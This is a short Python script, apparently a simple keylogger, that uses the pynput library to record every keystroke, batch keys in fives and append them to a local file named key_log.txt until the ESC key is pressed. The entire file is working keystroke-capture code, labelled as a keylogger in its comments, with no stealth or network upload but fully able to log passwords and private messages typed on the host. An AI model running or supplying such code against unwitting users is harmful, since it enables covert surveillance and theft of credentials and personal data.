from pynput.keyboard import Key, Listener

# Save log file as key_log.text
log_file = "key_log.txt"

# Variable to store logged keys
keys = []

def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            # This will replace special keys with readable strings
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')  # For space key, write a space
            elif k.find("Key") == -1:
                f.write(k)  # Writes regular character keys
            else:
                f.write(f' [{k}] ')  # Write special keys in brackets (e.g. [enter])

# This function appends each pressed key to the keys list
def on_press(key):
    keys.append(key)
    
    if len(keys) >= 5:  # Log after 5 key presses
        write_to_file(keys)
        keys.clear()

# Stop the keylogger when ESC is pressed
def on_release(key):
    if key == Key.esc:
        # Write remaining keys and stop the listener
        write_to_file(keys)
        return False

#launches keylogger 
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
